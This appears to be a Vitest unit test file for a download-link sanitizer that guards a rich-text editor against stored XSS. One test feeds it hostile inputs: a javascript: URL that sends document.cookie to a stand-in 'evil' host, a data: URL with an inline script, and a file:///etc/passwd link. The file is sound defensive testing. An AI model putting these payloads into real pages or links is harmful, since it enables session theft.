/**
 * safeDownloadHref — the stored-XSS guard for file-attachment download links
 * (security scan, CWE-79). Document node attributes are attacker-controllable,
 * and this NodeView bypasses TipTap's link sanitizer, so the href must be
 * vetted here.
 */
import { describe, it, expect } from 'vitest';
import { safeDownloadHref } from './FileAttachment';

describe('safeDownloadHref', () => {
  it('allows http(s) URLs (the normal CDN upload target)', () => {
    expect(safeDownloadHref('https://cdn.example.com/f/invoice.pdf')).toBe(
      'https://cdn.example.com/f/invoice.pdf'
    );
    expect(safeDownloadHref('http://files.example.com/x')).toBe('http://files.example.com/x');
  });

  it('allows same-origin relative paths', () => {
    expect(safeDownloadHref('/uploads/f/invoice.pdf')).toBe('/uploads/f/invoice.pdf');
  });

  it('blocks javascript: and other script-bearing schemes', () => {
    expect(safeDownloadHref('javascript:fetch("https://evil/?c="+document.cookie)')).toBeNull();
    expect(safeDownloadHref('JavaScript:alert(1)')).toBeNull();
    expect(safeDownloadHref('vbscript:msgbox(1)')).toBeNull();
    expect(safeDownloadHref('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(safeDownloadHref('file:///etc/passwd')).toBeNull();
  });

  it('blocks empty / non-string', () => {
    expect(safeDownloadHref('')).toBeNull();
    expect(safeDownloadHref(undefined)).toBeNull();
    expect(safeDownloadHref(null)).toBeNull();
    expect(safeDownloadHref(42)).toBeNull();
  });

  it('a bare string resolves to a harmless same-origin relative path (not script)', () => {
    // Not an XSS vector — the browser treats it as a relative link. The security
    // guarantee is only that script-bearing schemes never survive.
    const r = safeDownloadHref('not a url');
    expect(r).toBe('not a url');
    expect(r?.startsWith('javascript:')).toBe(false);
  });
});
